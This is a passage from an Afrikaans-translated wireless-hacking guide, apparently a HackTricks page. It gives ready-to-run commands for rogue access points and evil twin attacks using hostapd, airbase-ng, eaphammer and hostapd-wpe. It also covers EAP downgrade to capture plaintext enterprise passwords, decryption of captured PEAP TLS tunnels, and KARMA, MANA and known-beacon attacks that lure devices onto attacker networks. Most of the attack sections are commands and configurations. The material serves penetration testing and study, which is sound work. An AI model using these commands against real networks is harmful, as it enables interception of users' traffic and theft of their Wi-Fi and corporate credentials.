listen-address=127.0.0.1
```
Dan **stel IPs** en **roetes**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
En dan **begin** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Skep 'n konfigurasielêer `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Stop irriterende prosesse**, stel **monitor mode**, en **begin hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Deurstuur en Omleiding
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

An evil twin attack misbruik die manier waarop WiFi-kliënte netwerke herken, hoofsaaklik deur op die netwerknaam (ESSID) te staatmaak sonder om te vereis dat die basisstasie (access point) homself teenoor die kliënt moet autentiseer. Belangrike punte sluit in:

- **Moeilikheid om te onderskei**: Toestelle sukkel om te onderskei tussen legitieme en rogue access points wanneer hulle dieselfde ESSID en encryption type deel. Werklike netwerke gebruik dikwels meerdere access points met dieselfde ESSID om dekking naatloos uit te brei.
- **Client Roaming and Connection Manipulation**: Die 802.11-protokol laat toestelle toe om tussen access points binne dieselfde ESS te roam. Aanvallers kan dit misbruik deur 'n toestel te lok om van sy huidige basisstasie (access point) los te koppel en aan 'n rogue een te koppel. Dit kan bereik word deur 'n sterker sein aan te bied of die verbinding met die legitieme access point te ontwrig deur metodes soos deauthentication packets of jamming.
- **Uitdagings in uitvoering**: Om 'n evil twin attack suksesvol uit te voer in omgewings met meerdere, goed-geleë access points kan moeilik wees. Deauthenticating 'n enkele legitieme access point lei dikwels daartoe dat die toestel met 'n ander legitieme access point verbind, tensy die aanvaller alle nabygeleë access points kan deauthenticate of strategies die rogue access point kan plaas.

You can create a very basic Open Evil Twin (no capabilities to route traffic to Internet) doing:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Jy kan ook 'n Evil Twin skep met **eaphammer** (let daarop dat om evil twins met eaphammer te skep, die interface **should NOT be** in **monitor** mode):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Of deur Airgeddon te gebruik: `Options: 5,6,7,8,9 (inside Evil Twin attack menu).`

![](<../../images/image (1088).png>)

Let asseblief daarop dat standaard, as 'n ESSID in die PNL as WPA-beskerm gestoor is, die toestel nie outomaties aan 'n Open evil Twin sal koppel nie. Jy kan probeer om die werklike AP te DoS en hoop dat die gebruiker handmatig aan jou Open evil Twin koppel, of jy kan die werklike AP DoS en 'n WPA Evil Twin gebruik om die handshake te capture (met hierdie metode sal jy nie die slagoffer by jou kan laat koppel nie aangesien jy nie die PSK ken nie, maar jy kan die handshake vasvang en probeer crack).

_Sommige OS en AV sal die gebruiker waarsku dat om aan 'n Open netwerk te koppel gevaarlik is..._

### WPA/WPA2 Evil Twin

Jy kan 'n **Evil Twin using WPA/2** skep en as die toestelle ingestel is om na daardie SSID met WPA/2 te koppel, sal hulle probeer koppel. Om egter die **to complete the 4-way-handshake** te voltooi, moet jy ook die **password** ken wat die kliënt gaan gebruik. As jy dit **don't know**, sal die **connection won't be completed**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Om hierdie aanvalle te verstaan, beveel ek aan om eers die kort [WPA Enterprise explanation](#wpa-enterprise-mgt) te lees.

**Gebruik van hostapd-wpe**

`hostapd-wpe` benodig 'n **konfigurasie**-lêer om te werk. Om die generering van hierdie konfigurasies te **outomatiseer** kan jy [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad) gebruik (laai die python-lêer binne _/etc/hostapd-wpe/_ af).
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
In die konfigurasielêer kan jy baie verskillende dinge kies, soos ssid, channel, user files, cret/key, dh parameters, wpa version en auth...

[**Using hostapd-wpe with EAP-TLS to allow any certificate to login.**](evil-twin-eap-tls.md)

**Gebruik EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Standaard gebruik EAPHammer die volgende authentication methods (let wel: GTC is die eerste wat probeer om plaintext passwords te verkry, en daarna word meer robuuste auth methods gebruik):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Dit is die standaardmetodologie om lang verbindingstye te vermy. Jy kan egter ook aan die server die authentication methods spesifiseer van swakste tot sterkste:
```
--negotiate weakest
```
Of jy kan ook gebruik:

- `--negotiate gtc-downgrade` om die baie doeltreffende GTC downgrade implementering te gebruik (plaintext passwords)
- `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` om die metodes wat aangebied word handmatig te spesifiseer (deur dieselfde auth methods in dieselfde volgorde as die organisasie aan te bied sal die aanval baie moeiliker wees om op te spoor).
- [Find more info in the wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Gebruik Airgeddon**

`Airgeddon` kan vooraf gegenereerde sertifikate gebruik om EAP authentication aan WPA/WPA2-Enterprise netwerke aan te bied. Die vals netwerk sal die konneksieprotokol na EAP-MD5 afgradeer sodat dit die gebruiker en die MD5 van die wagwoord kan vang. Later kan die aanvaller probeer om die wagwoord te kraak.\
`Airggedon` bied jou die moontlikheid van 'n **continuous Evil Twin attack (noisy)** of **only create the Evil Attack until someone connects (smooth).**

![](<../../images/image (936).png>)

### Foutsporing van PEAP en EAP-TTLS TLS-tonnels in Evil Twins-aanvalle

_Hierdie metode is getoets in 'n PEAP-verbinding, maar aangesien ek 'n arbitrêre TLS-tonnel ontcijfer behoort dit ook met EAP-TTLS te werk._

Binne die **configuratie** van _hostapd-wpe_ **kommenteer** die reël wat _**dh_file**_ bevat (van `dh_file=/etc/hostapd-wpe/certs/dh` tot `#dh_file=/etc/hostapd-wpe/certs/dh`)\
Dit sal veroorsaak dat `hostapd-wpe` **exchange keys using RSA** in plaas van DH, sodat jy later die verkeer kan **decrypt** as jy die bediener se private sleutel ken.

Begin nou die **Evil Twin** met **`hostapd-wpe`** met daardie aangepaste konfigurasie soos gewoonlik. Begin ook **`wireshark`** in die **interface** wat die Evil Twin-aanval uitvoer.

Nou of later (wanneer jy reeds sommige authentication intents vasgevang het) kan jy die private RSA sleutel by wireshark voeg in: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Voeg 'n nuwe inskrywing by en vul die vorm met hierdie waardes: **IP address = any** -- **Port = 0** -- **Protocol = data** -- **Key File** (**select your key file**, to avoid problems select a key file **without being password protected**).

![](<../../images/image (687).png>)

En kyk na die nuwe **"Decrypted TLS" tab**:

![](<../../images/image (231).png>)

## KARMA, MANA, Loud MANA and Known beacons attack

### ESSID- en MAC swart-/witlyste

Verskillende tipes Media Access Control Filter Lists (MFACLs) en hul ooreenstemmende modi en effekte op die gedrag van 'n rogue Access Point (AP):

1. **MAC-based Whitelist**:
- Die rogue AP sal slegs op probe requests van toestelle wat in die whitelist gespesifiseer is reageer, en onsigbaar bly vir alle ander wat nie gelys is nie.
2. **MAC-based Blacklist**:
- Die rogue AP sal probe requests van toestelle op die blacklist ignoreer, wat die rogue AP effektief onsigbaar maak vir daardie spesifieke toestelle.
3. **SSID-based Whitelist**:
- Die rogue AP sal slegs op probe requests reageer vir spesifieke ESSIDs wat gelys is, wat dit onsigbaar maak vir toestelle waarvan die Preferred Network Lists (PNLs) nie daardie ESSIDs bevat nie.
4. **SSID-based Blacklist**:
- Die rogue AP sal nie op probe requests reageer vir die spesifieke ESSIDs wat op die blacklist is nie, wat dit onsigbaar maak vir toestelle wat na daardie netwerk soek.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Hierdie metode laat 'n **aanvaller toe om 'n kwaadwillige access point (AP) te skep wat op alle probe requests reageer** van toestelle wat probeer koppel aan netwerke. Hierdie tegniek **mislei toestelle om te koppel aan 'n aanvaller se AP** deur die netwerke te naboots wat die toestelle soek. Sodra 'n toestel 'n koppelingsversoek na hierdie rogue AP stuur, voltooi dit die verbinding, wat daartoe lei dat die toestel per ongeluk aan die aanvaller se netwerk koppel.

### MANA

Daarna het **toestelle begin om onbetroubare netwerkantwoorde te ignoreer**, wat die doeltreffendheid van die oorspronklike karma-aanval verminder het. 'n Nuwe metode, bekend as die **MANA attack**, is egter deur Ian de Villiers en Dominic White geïntroduceer. Hierdie metode behels die rogue AP wat **vasvang van die Preferred Network Lists (PNL) vanaf toestelle deur op hul broadcast probe requests te reageer** met netwerkname (SSIDs) wat vooraf deur die toestelle gestoor is. Hierdie gesofistikeerde aanval omseil die beskerming teen die oorspronklike karma-aanval deur die manier waarop toestelle bekende netwerke onthou en prioritiseer, uit te buit.

Die MANA attack funksioneer deur beide gerigte en broadcast probe requests van toestelle te moniteer. Vir gerigte requests neem dit die toestel se MAC-adres en die versoekte netwerknaam op en voeg hierdie inligting by 'n lys. Wanneer 'n broadcast request ontvang word, antwoord die AP met inligting wat ooreenstem met enige van die netwerke op die toestel se lys, wat die toestel verlei om aan die rogue AP te koppel.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

'n **Loud MANA attack** is 'n gevorderde strategie vir wanneer toestelle nie directed probing gebruik nie of wanneer hul Voorkeur-netwerklyste (PNL) onbekend is vir die aanvaller. Dit werk op die beginsel dat toestelle in dieselfde omgewing waarskynlik sekere netwerkname in hul PNLs deel. In plaas daarvan om selektief te reageer, stuur hierdie aanval probe responses uit vir elke netwerknaam (ESSID) wat in die gekombineerde PNLs van alle waargenome toestelle gevind word. Hierdie breë benadering verhoog die kans dat 'n toestel 'n bekende netwerk herken en probeer verbind met die skelm Access Point (AP).
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

Wanneer die **Loud MANA attack** moontlik nie voldoende is nie, bied die **Known Beacon attack** 'n ander benadering. Hierdie metode **brute-forces die konneksieproses deur 'n AP te simuleer wat op enige netwerknaam reageer, en 'n lys potensiële ESSIDs te deursoek** wat afgelei is van 'n woordlys. Dit simuleer die teenwoordigheid van talle netwerke in die hoop om 'n ESSID binne die slagoffer se PNL te kry, wat 'n konneksiepoging na die vervalste AP uitlok. Die aanval kan versterk word deur dit met die `--loud` opsie te kombineer vir 'n meer aggressiewe poging om toestelle vas te vang.

Eaphammer het hierdie aanval geïmplementeer as 'n MANA aanval waar al die ESSIDs in 'n lys uitgesaai word (jy kan dit ook met die `--loud` kombineer om 'n Loud MANA + Known beacons attack te skep):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Known Beacon Burst attack**

Die **Known Beacon Burst attack** behels **snel opeenvolgende uitsending van beacon frames vir elke ESSID wat in 'n lêer gelys is**. Dit skep 'n digte omgewing van vervalste netwerke, wat die waarskynlikheid dat toestelle met die rogue AP verbind aansienlik verhoog, veral wanneer dit met 'n MANA attack gekombineer word. Hierdie tegniek benut spoed en volume om toestelle se meganismes vir netwerkkeuse te oorweldig.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** is 'n protokol wat toestelle in staat stel om direk met mekaar te koppel via Wi-Fi sonder die nodigheid van 'n tradisionele draadlose access point. Hierdie vermoë is geïntegreer in verskeie Internet van Dinge (IoT)-toestelle, soos drukkers en televisies, en fasiliteer direkte toestel-tot-toestel kommunikasie. 'n Kenmerkende aspek van Wi-Fi Direct is dat een toestel die rol van 'n access point opneem, bekend as die group owner, om die verbinding te bestuur.

Sekuriteit vir Wi-Fi Direct-verbindinge word gevestig deur **Wi-Fi Protected Setup (WPS)**, wat verskeie metodes vir veilige koppeling ondersteun, insluitend:

- **Push-Button Configuration (PBC)**
- **PIN entry**
- **Near-Field Communication (NFC)**

Hierdie metodes, veral PIN entry, is vatbaar vir dieselfde kwesbaarhede as WPS in tradisionele Wi-Fi-netwerke, en vorm dus teikens vir soortgelyke aanvalvektore.

### EvilDirect Hijacking

**EvilDirect Hijacking** is 'n aanval spesifiek vir Wi-Fi Direct. Dit weerspieël die konsep van 'n Evil Twin-aanval maar is gemik op Wi-Fi Direct-verbindinge. In hierdie scenario doen 'n aanvaller voor as 'n legitieme group owner met die doel om toestelle te mislei om met 'n kwaadwillige entiteit te koppel. Hierdie metode kan uitgevoer word met gereedskap soos `airbase-ng` deur die kanaal, ESSID en MAC address van die nagebootste toestel te spesifiseer:

## References

- [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
- [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
- [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
- [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
- [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [The vulnerability that killed FreeWifi_Secure](https://7h30th3r0n3.fr/the-vulnerability-that-killed-freewifi_secure/)
- [RFC 4186 – EAP-SIM Authentication](https://datatracker.ietf.org/doc/html/rfc4186)
- [3GPP TS 33.402 – 3GPP system architecture evolution (SAE); Security aspects of non-3GPP accesses](https://www.3gpp.org/ftp/Specs/archive/33_series/33.402/)


TODO: Take a look to [https://github.com/wifiphisher/wifiphisher] (aanmelding met facebook en imitatie van WPA in captive portals)

{{#include ../../banners/hacktricks-training.md}}
